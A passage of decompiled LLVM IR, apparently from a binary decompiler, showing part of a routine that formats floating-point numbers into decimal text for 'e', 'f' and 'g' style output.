  %v9_8050379 = and i32 %v3_8050363, -256
  %v10_8050379 = or i32 %v7_8050379, %v9_8050379
  store i32 %v10_8050379, i32* %eax.global-to-local, align 4
  %v10_805037b = icmp eq i8 %v2_8050379, 97
  %v1_8050381 = icmp eq i1 %v10_805037b, false
  br i1 %v1_8050381, label %dec_label_pc_805038a, label %dec_label_pc_8050383

dec_label_pc_8050383:                             ; preds = %dec_label_pc_8050344
  %v2_8050383 = add i8 %v3_805036a, 6
  %v15_8050383 = zext i8 %v2_8050383 to i32
  %v18_8050383 = or i32 %v15_8050383, %v6_805036a
  store i32 %v18_8050383, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805038a

dec_label_pc_805038a:                             ; preds = %dec_label_pc_8050344, %dec_label_pc_8050383
  %stack_var_-207.0 = phi i8 [ %v3_805036a, %dec_label_pc_8050344 ], [ %v2_8050383, %dec_label_pc_8050383 ]
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v2_8050391 = icmp slt i32 %v2_805036d, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_80503a0 = select i1 %v2_8050391, i32 6, i32 %v2_805036d
  store i32 %v3_80503a0, i32* %ebp.global-to-local, align 4
  %v1_80503a3 = add i32 %tmp155, 12
  %v2_80503a3 = inttoptr i32 %v1_80503a3 to i32*
  %v3_80503a3 = load i32, i32* %v2_80503a3, align 4
  store i32 %v3_80503a3, i32* %eax.global-to-local, align 4
  %v2_80503a6 = and i32 %v3_80503a3, 2
  %v3_80503a6 = icmp eq i32 %v2_80503a6, 0
  br i1 %v3_80503a6, label %dec_label_pc_80503b4, label %dec_label_pc_80503c0

dec_label_pc_80503b4:                             ; preds = %dec_label_pc_805038a
  %v2_80503b4 = urem i32 %v3_80503a3, 2
  %tmp191 = trunc i32 %v2_80503b4 to i8
  %tmp = sub nsw i8 0, %tmp191
  %tmp192 = and i8 %tmp, 32
  br label %dec_label_pc_80503c0

dec_label_pc_80503c0:                             ; preds = %dec_label_pc_80503b4, %dec_label_pc_805038a
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_805038a ], [ %tmp192, %dec_label_pc_80503b4 ]
  %not.v5_80503c0 = fcmp uno x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %not.v5_80503c0, label %dec_label_pc_8050437, label %dec_label_pc_80503e2

dec_label_pc_80503e2:                             ; preds = %dec_label_pc_80503c0
  %v1_80503e2 = add i3 %v4_805035c, -2
  store i3 %v1_80503e2, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp154, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_80503e6 = fcmp ogt x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %v4_80503e6, label %bb, label %bb179

bb:                                               ; preds = %dec_label_pc_80503e2
  br label %dec_label_pc_8050472

bb179:                                            ; preds = %dec_label_pc_80503e2
  %v5_80503e6 = fcmp olt x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %v5_80503e6, label %bb180, label %dec_label_pc_80503ea

bb180:                                            ; preds = %bb179
  br label %dec_label_pc_8050472

dec_label_pc_80503ea:                             ; preds = %bb179
  %not.v4_80503e4 = fcmp une x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %not.v4_80503e4, label %dec_label_pc_8050472, label %dec_label_pc_8050507

dec_label_pc_8050437:                             ; preds = %dec_label_pc_80503c0
  store i3 %v4_805035c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp155, i32* %ebx.global-to-local, align 4
  %v1_805043e = add i32 %tmp155, 16
  %v2_805043e = inttoptr i32 %v1_805043e to i32*
  store i32 32, i32* %v2_805043e, align 4
  %v4_8050445 = add i8 %stack_var_-207.0, -96
  %v6_8050445 = sub i8 95, %stack_var_-207.0
  %v7_8050445 = and i8 %v6_8050445, %stack_var_-207.0
  %v8_8050445 = icmp slt i8 %v7_8050445, 0
  %v9_8050445 = icmp eq i8 %v4_8050445, 0
  %v10_8050445 = icmp slt i8 %v4_8050445, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_805045a = icmp eq i1 %v10_8050445, %v8_8050445
  %v4_805045a = icmp eq i1 %v9_8050445, false
  %v5_805045a = and i1 %v4_805045a, %v3_805045a
  br i1 %v5_805045a, label %dec_label_pc_8050461, label %dec_label_pc_805045c

dec_label_pc_805045c:                             ; preds = %dec_label_pc_8050437
  br label %dec_label_pc_8050461

dec_label_pc_8050461:                             ; preds = %dec_label_pc_8050437, %dec_label_pc_805045c
  %v2_8050469 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050469, i32* @ecx, align 4
  br label %dec_label_pc_8050832

dec_label_pc_8050472:                             ; preds = %dec_label_pc_80503ea, %bb180, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_805048c = xor i3 %v4_805035c, -4
  store i3 %v3_805048c, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8050492

dec_label_pc_8050492:                             ; preds = %dec_label_pc_80504e3, %dec_label_pc_8050472
  %v0_80504e3 = phi i32 [ 4096, %dec_label_pc_8050472 ], [ %v2_80504e3, %dec_label_pc_80504e3 ]
  %v2_8050495 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8050472 ], [ %v2_805049580, %dec_label_pc_80504e3 ]
  %v1_80504cd = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8050472 ], [ %v0_805049278, %dec_label_pc_80504e3 ]
  %v0_80504df65 = phi i32 [ 13, %dec_label_pc_8050472 ], [ %v1_8050494, %dec_label_pc_80504e3 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8050472 ], [ %stack_var_-220.1, %dec_label_pc_80504e3 ]
  %v1_8050494 = add i32 %v0_80504df65, -1
  %v4_8050495 = fcmp ule x86_fp80 %v1_80504cd, %v2_8050495
  br i1 %v4_8050495, label %dec_label_pc_80504bc, label %dec_label_pc_8050499

dec_label_pc_8050499:                             ; preds = %dec_label_pc_8050492
  store x86_fp80 %v1_80504cd, x86_fp80* %st0.global-to-local, align 4
  %v3_805049b = mul i32 %v1_8050494, 12
  store i32 %v3_805049b, i32* %eax.global-to-local, align 4
  %v1_805049e = add i32 %v3_805049b, ptrtoint (x86_fp80** @global_var_8054f80.190 to i32)
  %v2_805049e = inttoptr i32 %v1_805049e to x86_fp80*
  %v3_805049e = load x86_fp80, x86_fp80* %v2_805049e, align 4
  %v4_80504a4 = fmul x86_fp80 %v1_80504cd, %v3_805049e
  store x86_fp80 %v4_80504a4, x86_fp80* %st1.global-to-local, align 4
  %v4_80504a8 = fcmp ule x86_fp80 %v4_80504a4, %v3_805049e
  br i1 %v4_80504a8, label %dec_label_pc_80504dd, label %dec_label_pc_80504ac

dec_label_pc_80504ac:                             ; preds = %dec_label_pc_8050499
  store x86_fp80 %v4_80504a4, x86_fp80* %st1.global-to-local, align 4
  %v5_80504b6 = sub i32 %stack_var_-220.0, %v0_80504e3
  br label %dec_label_pc_80504df

dec_label_pc_80504bc:                             ; preds = %dec_label_pc_8050492
  %v3_80504bc = mul i32 %v1_8050494, 12
  store i32 %v3_80504bc, i32* %eax.global-to-local, align 4
  %v1_80504bf = add i32 %v3_80504bc, ptrtoint (x86_fp80** @global_var_8054f80.190 to i32)
  %v2_80504bf = inttoptr i32 %v1_80504bf to x86_fp80*
  %v3_80504bf = load x86_fp80, x86_fp80* %v2_80504bf, align 4
  %v4_80504c5 = fdiv x86_fp80 %v3_80504bf, %v1_80504cd
  store x86_fp80 %v4_80504c5, x86_fp80* %st1.global-to-local, align 4
  %v4_80504c7 = fcmp ogt x86_fp80 %v3_80504bf, %v1_80504cd
  br i1 %v4_80504c7, label %.thread54, label %bb182

.thread54:                                        ; preds = %dec_label_pc_80504bc
  store x86_fp80 %v3_80504bf, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80504cd

bb182:                                            ; preds = %dec_label_pc_80504bc
  %v5_80504c7 = fcmp olt x86_fp80 %v3_80504bf, %v1_80504cd
  br i1 %v5_80504c7, label %.thread50, label %bb183

.thread50:                                        ; preds = %bb182
  store x86_fp80 %v3_80504bf, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80504dd

bb183:                                            ; preds = %bb182
  %not.v6_80504c7 = fcmp une x86_fp80 %v3_80504bf, %v1_80504cd
  store x86_fp80 %v3_80504bf, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_80504c7, label %dec_label_pc_80504dd, label %dec_label_pc_80504cd

dec_label_pc_80504cd:                             ; preds = %.thread54, %bb183
  store x86_fp80 %v3_80504bf, x86_fp80* %st1.global-to-local, align 4
  %v5_80504d7 = add i32 %stack_var_-220.0, %v0_80504e3
  br label %dec_label_pc_80504df

dec_label_pc_80504dd:                             ; preds = %dec_label_pc_8050499, %.thread50, %bb183
  %v1_80504dd = phi x86_fp80 [ %v1_80504cd, %.thread50 ], [ %v1_80504cd, %bb183 ], [ %v3_805049e, %dec_label_pc_8050499 ]
  %v0_805049279 = phi x86_fp80 [ %v3_80504bf, %.thread50 ], [ %v3_80504bf, %bb183 ], [ %v4_80504a4, %dec_label_pc_8050499 ]
  store x86_fp80 %v1_80504dd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80504df

dec_label_pc_80504df:                             ; preds = %dec_label_pc_80504cd, %dec_label_pc_80504ac, %dec_label_pc_80504dd
  %v2_805049580 = phi x86_fp80 [ %v1_80504dd, %dec_label_pc_80504dd ], [ %v2_8050495, %dec_label_pc_80504cd ], [ %v1_80504cd, %dec_label_pc_80504ac ]
  %v0_805049278 = phi x86_fp80 [ %v0_805049279, %dec_label_pc_80504dd ], [ %v3_80504bf, %dec_label_pc_80504cd ], [ %v4_80504a4, %dec_label_pc_80504ac ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_80504dd ], [ %v5_80504d7, %dec_label_pc_80504cd ], [ %v5_80504b6, %dec_label_pc_80504ac ]
  %v1_80504df = icmp eq i32 %v1_8050494, 0
  br i1 %v1_80504df, label %.thread59, label %dec_label_pc_80504e3

dec_label_pc_80504e3:                             ; preds = %dec_label_pc_80504df
  %v2_80504e3 = sdiv i32 %v0_80504e3, 2
  store i32 %v2_80504e3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050492

.thread59:                                        ; preds = %dec_label_pc_80504df
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8050507

dec_label_pc_8050507:                             ; preds = %dec_label_pc_80503ea, %.thread59
  %v0_80505c1 = phi i32 [ %stack_var_-220.1, %.thread59 ], [ -1, %dec_label_pc_80503ea ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread59 ], [ 0xK3FFF8000000000000000, %dec_label_pc_80503ea ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_805050b = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80503e2, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_805051e = and i32 %v2_805050b, -65536
  %v1_8050523 = udiv i16 %tmp145, 256
  %v2_8050523 = zext i16 %v1_8050523 to i32
  %v3_8050523 = or i32 %v2_8050523, 12
  %v10_8050523 = mul nuw nsw i32 %v3_8050523, 256
  %tmp193 = urem i16 %tmp145, 256
  %v4_805051e.masked = zext i16 %tmp193 to i32
  %v11_8050523 = or i32 %v10_8050523, %v4_805051e.masked
  %v12_8050523 = or i32 %v11_8050523, %v6_805051e
  store i32 %v12_8050523, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805052b

dec_label_pc_805052b:                             ; preds = %dec_label_pc_805057d.dec_label_pc_805052b_crit_edge, %dec_label_pc_8050507
  %v2_8050550 = phi x86_fp80 [ %storemerge, %dec_label_pc_8050507 ], [ %v2_8050550.pre, %dec_label_pc_805057d.dec_label_pc_805052b_crit_edge ]
  %v1_805052b = phi i3 [ %v1_80503e2, %dec_label_pc_8050507 ], [ %v1_805052b.pre, %dec_label_pc_805057d.dec_label_pc_805052b_crit_edge ]
  %v3_8050552 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8050507 ], [ %v0_805052b.pre, %dec_label_pc_805057d.dec_label_pc_805052b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805050b, %dec_label_pc_8050507 ], [ %v4_805054b, %dec_label_pc_805057d.dec_label_pc_805052b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp194 = fptosi x86_fp80 %v3_8050552 to i32
  store i32 %tmp194, i32* %eax.global-to-local, align 4
  store i32 %tmp194, i32* %ecx.global-to-local, align 4
  %v5_8050545 = sitofp i32 %tmp194 to x86_fp80
  %v4_805054b = add i32 %stack_var_-212.0, 9
  %v4_8050550 = fsub x86_fp80 %v2_8050550, %v5_8050545
  store i3 %v1_805052b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8050552 = fmul x86_fp80 %v3_8050552, %v4_8050550
  store x86_fp80 %v4_8050552, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8050554

dec_label_pc_8050554:                             ; preds = %dec_label_pc_8050554.dec_label_pc_8050554_crit_edge, %dec_label_pc_805052b
  %v0_8050568 = phi i32 [ %v0_8050568.pre, %dec_label_pc_8050554.dec_label_pc_8050554_crit_edge ], [ %tmp194, %dec_label_pc_805052b ]
  %v0_8050558 = phi i32 [ %v0_8050558.pre, %dec_label_pc_8050554.dec_label_pc_8050554_crit_edge ], [ 0, %dec_label_pc_805052b ]
  %v1_8050558 = add i32 %v0_8050558, 1
  store i32 %v1_8050558, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8050562 = sub i32 %v4_805054b, %v1_8050558
  %div = udiv i32 %v0_8050568, 10
  %tmp184 = urem i32 %v0_8050568, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_805056e = and i32 %div, 536870656
  store i32 %v2_8050562, i32* %edx.global-to-local, align 4
  %v1_8050574 = trunc i32 %tmp184 to i8
  %v2_8050574 = or i8 %v1_8050574, 48
  %v12_8050574 = zext i8 %v2_8050574 to i32
  %v15_8050574 = or i32 %v12_8050574, %v3_805056e
  store i32 %v15_8050574, i32* %eax.global-to-local, align 4
  %v3_8050579 = inttoptr i32 %v2_8050562 to i8*
  store i8 %v2_8050574, i8* %v3_8050579, align 1
  %v7_805057b = icmp sgt i32 %v1_8050558, 8
  br i1 %v7_805057b, label %dec_label_pc_805057d, label %dec_label_pc_8050554.dec_label_pc_8050554_crit_edge

dec_label_pc_8050554.dec_label_pc_8050554_crit_edge: ; preds = %dec_label_pc_8050554
  %v0_8050558.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8050568.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050554

dec_label_pc_805057d:                             ; preds = %dec_label_pc_8050554
  %v0_805057d = load i32, i32* @edi, align 4
  %v1_805057d = add i32 %v0_805057d, 1
  store i32 %v1_805057d, i32* @edi, align 4
  %v7_8050581 = icmp sgt i32 %v1_805057d, 2
  br i1 %v7_8050581, label %dec_label_pc_8050583, label %dec_label_pc_805057d.dec_label_pc_805052b_crit_edge

dec_label_pc_805057d.dec_label_pc_805052b_crit_edge: ; preds = %dec_label_pc_805057d
  %v0_805052b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805052b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8050550.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805052b

dec_label_pc_8050583:                             ; preds = %dec_label_pc_805057d
  %v0_8050583 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8050583 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8050583, x86_fp80* %st0.global-to-local, align 4
  %v2_8050585 = add i3 %v0_8050583, 2
  store i3 %v2_8050585, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8050587 = add i8 %stack_var_-207.0, -96
  %v6_8050587 = sub i8 95, %stack_var_-207.0
  %v7_8050587 = and i8 %v6_8050587, %stack_var_-207.0
  %v8_8050587 = icmp slt i8 %v7_8050587, 0
  %v9_8050587 = icmp eq i8 %v4_8050587, 0
  %v10_8050587 = icmp slt i8 %v4_8050587, 0
  %v3_805058c = icmp eq i1 %v10_8050587, %v8_8050587
  %v4_805058c = icmp eq i1 %v9_8050587, false
  %v5_805058c = and i1 %v4_805058c, %v3_805058c
  br i1 %v5_805058c, label %dec_label_pc_805059b, label %dec_label_pc_805058e

dec_label_pc_805058e:                             ; preds = %dec_label_pc_8050583
  %v4_805058e = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_805059b

dec_label_pc_805059b:                             ; preds = %dec_label_pc_8050583, %dec_label_pc_805058e
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8050583 ], [ %v4_805058e, %dec_label_pc_805058e ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8050583 ], [ 69, %dec_label_pc_805058e ]
  %v12_805059b = icmp eq i8 %stack_var_-207.1, 103
  %v1_80505a0 = icmp eq i1 %v12_805059b, false
  br i1 %v1_80505a0, label %dec_label_pc_80505a9, label %dec_label_pc_80505a2

dec_label_pc_80505a2:                             ; preds = %dec_label_pc_805059b
  %v0_80505a2 = load i32, i32* %ebp.global-to-local, align 4
  %tmp185 = icmp slt i32 %v0_80505a2, 1
  br i1 %tmp185, label %dec_label_pc_80505b0, label %dec_label_pc_80505a6

dec_label_pc_80505a6:                             ; preds = %dec_label_pc_80505a2
  %v1_80505a6 = add i32 %v0_80505a2, -1
  store i32 %v1_80505a6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80505b0

dec_label_pc_80505a9:                             ; preds = %dec_label_pc_805059b
  %v12_80505a9 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_80505a9, label %dec_label_pc_80505b4, label %dec_label_pc_80505a9.dec_label_pc_80505b0_crit_edge

dec_label_pc_80505a9.dec_label_pc_80505b0_crit_edge: ; preds = %dec_label_pc_80505a9
  %v0_80505b0.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80505b0

dec_label_pc_80505b0:                             ; preds = %dec_label_pc_80505a9.dec_label_pc_80505b0_crit_edge, %dec_label_pc_80505a2, %dec_label_pc_80505a6
  %v0_80505b0 = phi i32 [ %v0_80505b0.pre, %dec_label_pc_80505a9.dec_label_pc_80505b0_crit_edge ], [ %v0_80505a2, %dec_label_pc_80505a2 ], [ %v1_80505a6, %dec_label_pc_80505a6 ]
  store i32 %v0_80505b0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80505e1

dec_label_pc_80505b4:                             ; preds = %dec_label_pc_80505a9
  store i32 %v0_80505c1, i32* %eax.global-to-local, align 4
  %v0_80505b8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80505b8 = add i32 %v0_80505b8, %v0_80505c1
  store i32 %v2_80505b8, i32* %ebx.global-to-local, align 4
  %v5_80505bf = icmp slt i32 %v2_80505b8, -1
  br i1 %v5_80505bf, label %dec_label_pc_80505c1, label %dec_label_pc_80505e1

dec_label_pc_80505c1:                             ; preds = %dec_label_pc_80505b4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80505c9 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80505c9, i32* %eax.global-to-local, align 4
  %v4_80505d1 = bitcast i32* %stack_var_-72 to i8*
  %v5_80505d1 = call i32 @function_804d4e0(i8* %v4_80505d1, i32 48, i32 21)
  store i32 %v5_80505d1, i32* %eax.global-to-local, align 4
  %v0_80505e1.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80505e1

dec_label_pc_80505e1:                             ; preds = %dec_label_pc_80505b4, %dec_label_pc_80505c1, %dec_label_pc_80505b0
  %v1_8050601 = phi i32 [ %v0_80505b0, %dec_label_pc_80505b0 ], [ %v2_80505b8, %dec_label_pc_80505b4 ], [ %v0_80505e1.pr.pre, %dec_label_pc_80505c1 ]
  %stack_var_-220.3 = phi i32 [ %v0_80505c1, %dec_label_pc_80505b0 ], [ %v0_80505c1, %dec_label_pc_80505b4 ], [ -1, %dec_label_pc_80505c1 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_80505f4 = icmp sgt i32 %v1_8050601, 20
  br i1 %v7_80505f4, label %dec_label_pc_80505f6, label %dec_label_pc_8050601

dec_label_pc_80505f6:                             ; preds = %dec_label_pc_80505e1
  %v2_80505f6 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_80505f6, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050615.preheader

dec_label_pc_8050601:                             ; preds = %dec_label_pc_80505e1
  %v0_8050601 = load i32, i32* @esp, align 4
  %v2_8050601 = add i32 %v1_8050601, 165
  %v3_8050601 = add i32 %v2_8050601, %v0_8050601
  store i32 %v3_8050601, i32* %eax.global-to-local, align 4
  %v1_8050608 = add i32 %v3_8050601, 2
  %v2_8050608 = inttoptr i32 %v1_8050608 to i8*
  %v3_8050608 = load i8, i8* %v2_8050608, align 1
  %v4_8050608 = add i8 %v3_8050608, -53
  %v9_8050608 = sub i8 52, %v3_8050608
  %v10_8050608 = and i8 %v9_8050608, %v3_8050608
  %v11_8050608 = icmp slt i8 %v10_8050608, 0
  %v13_8050608 = icmp slt i8 %v4_8050608, 0
  store i32 %v1_8050608, i32* %ecx.global-to-local, align 4
  %v2_805060f = icmp eq i1 %v13_8050608, %v11_8050608
  %v3_805060f = zext i1 %v2_805060f to i32
  br label %dec_label_pc_8050615.preheader

dec_label_pc_8050615.preheader:                   ; preds = %dec_label_pc_8050601, %dec_label_pc_80505f6
  %v0_8050615101 = phi i32 [ %v1_8050608, %dec_label_pc_8050601 ], [ %v2_80505f6, %dec_label_pc_80505f6 ]
  %storemerge70 = phi i32 [ %v3_805060f, %dec_label_pc_8050601 ], [ 0, %dec_label_pc_80505f6 ]
  store i32 %storemerge70, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050615

dec_label_pc_8050615:                             ; preds = %dec_label_pc_8050615.backedge, %dec_label_pc_8050615.preheader
  %v3_8050616 = phi i32 [ %v3_8050616.pre, %dec_label_pc_8050615.backedge ], [ %storemerge70, %dec_label_pc_8050615.preheader ]
  %v0_8050615 = phi i32 [ %v0_8050618, %dec_label_pc_8050615.backedge ], [ %v0_8050615101, %dec_label_pc_8050615.preheader ]
  %v1_8050615 = add i32 %v0_8050615, -1
  store i32 %v1_8050615, i32* %ecx.global-to-local, align 4
  %v1_8050616 = inttoptr i32 %v1_8050615 to i8*
  %v2_8050616 = load i8, i8* %v1_8050616, align 1
  %v4_8050616 = trunc i32 %v3_8050616 to i8
  %v5_8050616 = add i8 %v2_8050616, %v4_8050616
  store i8 %v5_8050616, i8* %v1_8050616, align 1
  %v0_8050618 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050618 = inttoptr i32 %v0_8050618 to i8*
  %v2_8050618 = load i8, i8* %v1_8050618, align 1
  %v3_8050618 = zext i8 %v2_8050618 to i32
  %v4_8050618 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050618 = and i32 %v4_8050618, -256
  %v6_8050618 = or i32 %v5_8050618, %v3_8050618
  store i32 %v6_8050618, i32* %edx.global-to-local, align 4
  %v7_805061a = icmp eq i8 %v2_8050618, 48
  br i1 %v7_805061a, label %dec_label_pc_8050615.backedge, label %dec_label_pc_805061f

dec_label_pc_8050615.backedge:                    ; preds = %dec_label_pc_8050615, %dec_label_pc_805061f
  %v3_8050616.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050615

dec_label_pc_805061f:                             ; preds = %dec_label_pc_8050615
  %v2_805061f = add i8 %v2_8050618, -57
  %v7_805061f = sub i8 56, %v2_8050618
  %v8_805061f = and i8 %v7_805061f, %v2_8050618
  %v9_805061f = icmp slt i8 %v8_805061f, 0
  %v10_805061f = icmp eq i8 %v2_805061f, 0
  %v11_805061f = icmp slt i8 %v2_805061f, 0
  %v3_8050622 = icmp eq i1 %v11_805061f, %v9_805061f
  %v4_8050622 = icmp eq i1 %v10_805061f, false
  %v5_8050622 = and i1 %v4_8050622, %v3_8050622
  br i1 %v5_8050622, label %dec_label_pc_8050615.backedge, label %dec_label_pc_8050624

dec_label_pc_8050624:                             ; preds = %dec_label_pc_805061f
  %v2_8050624 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8050624, i32* %eax.global-to-local, align 4
  %tmp195 = icmp ugt i32 %v0_8050618, %v2_8050624
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp195, label %dec_label_pc_805062f, label %dec_label_pc_805063c

dec_label_pc_805062f:                             ; preds = %dec_label_pc_8050624
  store i32 %v2_805050b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050645

dec_label_pc_805063c:                             ; preds = %dec_label_pc_8050624
  store i32 %v2_8050624, i32* %edx.global-to-local, align 4
  store i32 %v2_8050624, i32* %ecx.global-to-local, align 4
  %v1_8050644 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8050644, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050645

dec_label_pc_8050645:                             ; preds = %dec_label_pc_805062f, %dec_label_pc_805063c
  %v0_8050645 = phi i32 [ %v0_8050618, %dec_label_pc_805062f ], [ %v2_8050624, %dec_label_pc_805063c ]
  %v1_8050645 = add i32 %v0_8050645, 1
  store i32 %v1_8050645, i32* %eax.global-to-local, align 4
  %v2_805064c = inttoptr i32 %v1_8050645 to i8*
  store i8 0, i8* %v2_805064c, align 1
  br i1 %v1_80505a0, label %dec_label_pc_8050672, label %dec_label_pc_8050657

dec_label_pc_8050657:                             ; preds = %dec_label_pc_8050645
  %v0_8050657 = load i32, i32* %esi.global-to-local, align 4
  %v5_805065a = icmp slt i32 %v0_8050657, -4
  br i1 %v5_805065a, label %dec_label_pc_805067f, label %dec_label_pc_805065c

dec_label_pc_805065c:                             ; preds = %dec_label_pc_8050657
  %v1_805065c = load i32, i32* %ebx.global-to-local, align 4
  %v7_805065e = icmp slt i32 %v1_805065c, %v0_8050657
  br i1 %v7_805065e, label %dec_label_pc_805067f, label %dec_label_pc_8050667

dec_label_pc_8050667:                             ; preds = %dec_label_pc_805065c
  %v2_8050669 = sub i32 %v1_805065c, %v0_8050657
  store i32 %v2_8050669, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050683

dec_label_pc_8050672:                             ; preds = %dec_label_pc_8050645
  %v4_8050672 = zext i8 %stack_var_-207.1 to i32
  %v5_8050672 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8050672 = and i32 %v5_8050672, -256
  %v7_8050672 = or i32 %v6_8050672, %v4_8050672
  store i32 %v7_8050672, i32* %ebx.global-to-local, align 4
  %v10_8050676 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8050676, label %dec_label_pc_8050672.dec_label_pc_8050683_crit_edge, label %dec_label_pc_805067f

dec_label_pc_8050672.dec_label_pc_8050683_crit_edge: ; preds = %dec_label_pc_8050672
  %v0_8050683.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050683

dec_label_pc_805067f:                             ; preds = %dec_label_pc_8050657, %dec_label_pc_805065c, %dec_label_pc_8050672
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8050672 ], [ 103, %dec_label_pc_805065c ], [ 103, %dec_label_pc_8050657 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805068d

dec_label_pc_8050683:                             ; preds = %dec_label_pc_8050672.dec_label_pc_8050683_crit_edge, %dec_label_pc_8050667
  %v0_8050685 = phi i32 [ %v0_8050683.pre, %dec_label_pc_8050672.dec_label_pc_8050683_crit_edge ], [ %v0_8050657, %dec_label_pc_8050667 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8050672.dec_label_pc_8050683_crit_edge ], [ 102, %dec_label_pc_8050667 ]
  %v2_8050683 = icmp slt i32 %v0_8050685, 0
  store i32 %v0_8050685, i32* %ebx.global-to-local, align 4
  %v1_8050687 = icmp eq i1 %v2_8050683, false
  br i1 %v1_8050687, label %dec_label_pc_805068d, label %dec_label_pc_8050689

dec_label_pc_8050689:                             ; preds = %dec_label_pc_8050683
  %v0_8050689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050689 = add i32 %v0_8050689, -1
  store i32 %v1_8050689, i32* %edx.global-to-local, align 4
  %v1_805068a = inttoptr i32 %v1_8050689 to i8*
  store i8 48, i8* %v1_805068a, align 1
  %v0_80506c2.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805068d

dec_label_pc_805068d:                             ; preds = %dec_label_pc_8050683, %dec_label_pc_805067f, %dec_label_pc_8050689
  %v1_805071d = phi i32 [ %v0_8050685, %dec_label_pc_8050683 ], [ %v0_80506c2.pre, %dec_label_pc_8050689 ], [ 0, %dec_label_pc_805067f ]
